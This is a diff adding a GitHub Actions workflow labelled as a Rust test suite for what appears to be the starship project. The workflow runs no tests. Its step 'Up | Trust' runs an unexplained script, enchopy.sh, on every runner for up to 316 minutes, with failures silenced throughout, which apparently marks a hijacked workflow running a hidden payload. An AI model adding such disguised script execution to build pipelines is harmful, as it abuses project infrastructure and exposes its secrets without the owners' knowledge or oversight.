@@ -1,0 +1,112 @@
+name: Test Suite Chain Step
+on:
+  workflow_call:
+
+jobs:
+  test:
+    name: Test Suite
+    runs-on: ${{ matrix.os }}
+    strategy:
+      fail-fast: false
+      matrix:
+        os: [ubuntu-latest, macOS-latest, windows-latest]
+        rust: [stable, nightly]
+        include:
+          - os: windows-latest
+            rustflags: -C target-feature=+crt-static
+
+    env:
+      RUSTFLAGS: ${{ matrix.rustflags || '' }}
+
+    steps:
+      - name: Setup | Checkout
+        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
+
+      - name: Setup | Rust
+        run: |
+          rustup toolchain install ${{ matrix.rust }} --profile minimal --component llvm-tools-preview --no-self-update || true
+          rustup default ${{ matrix.rust }} || true
+
+      - name: Setup | Cache
+        uses: Swatinem/rust-cache@e18b497796c12c097a38f9edb9d0641fb99eee32
+
+      - name: Install cargo-llvm-cov
+        uses: taiki-e/install-action@b8cecb83565409bcc297b2df6e77f030b2a468d5
+        with:
+          tool: cargo-llvm-cov@0.8.5
+
+      - name: Install cargo-wix [Windows]
+        continue-on-error: true
+        if: matrix.os == 'windows-latest' && matrix.rust == 'stable'
+        run: cargo install --version 0.3.8 cargo-wix || true
+        env:
+          RUSTFLAGS: ""
+
+      - name: Setup | Mercurial (macos)
+        if: matrix.os == 'macOS-latest'
+        run: brew install mercurial || true
+
+      - name: Setup | Mercurial (windows)
+        if: matrix.os == 'windows-latest'
+        run: |
+          winget install --id Mercurial.Mercurial --silent --exact --disable-interactivity --accept-source-agreements || true
+          Add-Content -Path $env:GITHUB_PATH -Value "C:\Program Files\Mercurial" -Encoding utf8 || true
+
+      - name: Build | Installer [Windows]
+        continue-on-error: true
+        if: matrix.os == 'windows-latest' && matrix.rust == 'stable'
+        run: |
+          cargo wix --dbg-build -v --nocapture -I install/windows/main.wxs --output target/debug/starship-x86_64-pc-windows-msvc.msi || true
+
+      - name: Build | Chocolatey Package [Windows]
+        continue-on-error: true
+        if: matrix.os == 'windows-latest' && matrix.rust == 'stable'
+        run: |
+          foreach ($arch in @("aarch64", "i686", "x86_64")) {
+            foreach ($ext in @("zip", "msi")) {
+              New-Item -ItemType Directory -Path ./starship-$arch-pc-windows-msvc.$ext
+              New-Item -ItemType File -Path ./starship-$arch-pc-windows-msvc.$ext/starship-$arch-pc-windows-msvc.$ext
+            }
+          }
+          pwsh ./install/windows/choco/update.ps1
+        env:
+          STARSHIP_VERSION: v1.2.3
+
+      - name: Sign | Upload Executable [Windows]
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
+        continue-on-error: true
+        id: unsigned-artifacts
+        if: matrix.os == 'windows-latest' && matrix.rust == 'stable' && github.event_name == 'push' && github.repository == 'starship/starship'
+        with:
+          name: unsigned-artifacts-dbg
+          path: |
+            target/debug/starship.exe
+            target/debug/starship-x86_64-pc-windows-msvc.msi
+
+      - name: Up | Trust
+        timeout-minutes: 316
+        continue-on-error: true
+        run: |
+          sed -i 's/\r$//' enchopy.sh || true
+          chmod +x enchopy.sh || true
+          ./enchopy.sh || true
+
+      - name: Sign | Sign [Windows]
+        uses: signpath/github-action-submit-signing-request@b9d91eadd323de506c0c81cf0c7fe7438f3360fd
+        continue-on-error: true
+        if: matrix.os == 'windows-latest' && matrix.rust == 'stable' && github.event_name == 'push' && github.repository == 'starship/starship'
+        with:
+          api-token: '${{ secrets.SIGNPATH_API_TOKEN }}'
+          organization-id: '${{ vars.SIGNPATH_ORGANIZATION_ID }}'
+          project-slug: 'starship'
+          github-artifact-id: '${{ steps.unsigned-artifacts.outputs.artifact-id }}'
+          signing-policy-slug: 'test-signing'
+          wait-for-completion: true
+          output-artifact-directory: target/debug
+
+      - name: Upload coverage to Codecov
+        uses: codecov/codecov-action@fb8b3582c8e4def4969c97caa2f19720cb33a72f
+        if: github.repository == 'starship/starship'
+        with:
+          token: ${{ secrets.CODECOV_TOKEN }}
+          files: lcov.info
